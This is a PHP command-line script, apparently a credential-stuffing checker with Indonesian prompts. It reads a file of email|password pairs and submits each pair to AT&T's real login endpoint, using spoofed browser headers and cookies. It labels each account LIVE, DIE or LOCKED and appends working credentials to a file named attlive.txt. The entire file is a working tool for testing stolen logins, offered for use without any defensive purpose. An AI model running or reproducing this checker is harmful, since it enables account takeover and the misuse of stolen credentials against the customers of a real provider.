<?php
error_reporting(0);
echo "File Akun : ";
$fileakun = trim(fgets(STDIN));
print PHP_EOL."Total Ada : ".count(explode("\n", str_replace("\r","",@file_get_contents($fileakun))))." Akun, Letsgo..\n";
foreach(explode("\n", str_replace("\r", "", @file_get_contents($fileakun))) as $c => $akon)
	{
		$pecah = explode("|", trim($akon));
		$email = trim($pecah[0]);
		$pass = trim($pecah[1]);
$get_cookie = get_cookie();
preg_match('/<input type="hidden" name="previousRefID" value=(.*?)>/', $get_cookie, $reff_id);
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $get_cookie, $cookie);
$cek = cek($email,$cookie,$pass,$reff_id);
if(preg_match('/<p>Please make sure that your User ID and Password are both correct, and try again./', $cek)){
	echo "DIE $email|$pass \n";
	} else if(preg_match('/Your account has been locked due to too many failed logins. Please, contact AT&T operator./', $cek)){
	echo "LOCKED $email|$pass \n";
	} else if(preg_match('/Your account has been locked due to too many failed logins. Please, wait 1 hour, and try again./', $cek)){
	echo "LOCKED $email|$pass \n";
	}	
	else if(preg_match('/login_success/i', $cek))
	{
		echo "LIVE $email|$pass \n";
		 $livee = "attlive.txt";
    $fopen = fopen($livee, "a+");
    $fwrite = fwrite($fopen, "SUCCESS => ".$email." | ".$pass." | ".$voc_id." \n");
    fclose($fopen);
		} else{
			echo "DIE $email|$pass \n";
}
}
function get_cookie()
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://loginprodx.att.net/commonLogin/igate_edam/controller.do?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&METHOD=GET&URL=%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%253A%252F%252Flogin.yahoo.com%252Fsaml%252F2.0%252Fatt%26.lang%3Den-US%26Target%3Dhttps%253A%252F%252Fwww.yahoo.com%252F%3Ftucd567%3Dw&REFERER=https%3A%2F%2Fwww.google.com%2F&HOSTNAME=loginprodx.att.net&AUTHNLEVEL=&FAILREASON=&PROTOCOL=https&OLDSESSION=&fbclid=IwAR399iuBKZA9B8M39pyGLxdj6sqbFmfAVdbLFubSgG7b8iJ4xBuIedTzaYc');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$headers = array();
$headers[] = 'Content-Type:application/x-www-form-urlencoded';
$headers[] = 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
$headers[] = 'Accept-Language:id-ID,en-US;q=0.9';
$headers[] = 'User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/11.4.3-g';
$headers[] = 'Cookie: JSESSIONID=000002BbCu3MtjNAoCkWBILREsh:15coe43va; ri957=e1gsQsgEGuPGUYk2aN2rY12rDok%2BsRppNT6W%2BDpkWRFdLMmwzpblE6EuFAOeU4sieluTObXaBtdnqgmxu2COxw%3D%3D; PD_STATEFUL_d090d90c-c860-11de-a85c-001f29ebfd16=%2FcommonLogin; check=true; AMCVS_55633F7A534535110A490D44%40AdobeOrg=1; s_dfa=attglobalprod%2Cattnetprod; AMCV_55633F7A534535110A490D44%40AdobeOrg=1994364360%7CMCMID%7C46804921008754095681377355385771811629%7CMCAAMLH-1580676372%7C3%7CMCAAMB-1580676372%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1580078772s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C3.4.0; IV_JCT=%2FcommonLogin; mbox=session#4491a4fa36554bb2b19efdd89d9c0631#1580073435|PC#4491a4fa36554bb2b19efdd89d9c0631.29_0#1643316375; mboxEdgeCluster=29; s_cc=true; pses={"id":"nfvx77ai57g","start":1580071578042,"last":1580071578047}';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
$result = curl_exec($ch);
return $result;
}
function cek($email,$cookie,$pass,$reff_id)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://loginprodx.att.net/commonLogin/igate_edam/login.do');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%253A%252F%252Flogin.yahoo.com%252Fsaml%252F2.0%252Fatt%26.lang%3Den-US%26Target%3Dhttps%253A%252F%252Fwww.yahoo.com%252F&previousRefID='.$reff_id[1].'&optOutGroupUpdate=null&mergredID=null&userid=$email&password=$pass");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Content-Type:application/x-www-form-urlencoded';
$headers[] = 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
$headers[] = 'Accept-Language:id-ID,en-US;q=0.9';
$headers[] = 'User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/11.4.3-g';
$headers[] = 'Cookie: '.$cookie[1][0].'; '.$cookie[1][1].'; '.$cookie[1][2].'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
$result = curl_exec($ch);
return $result;
}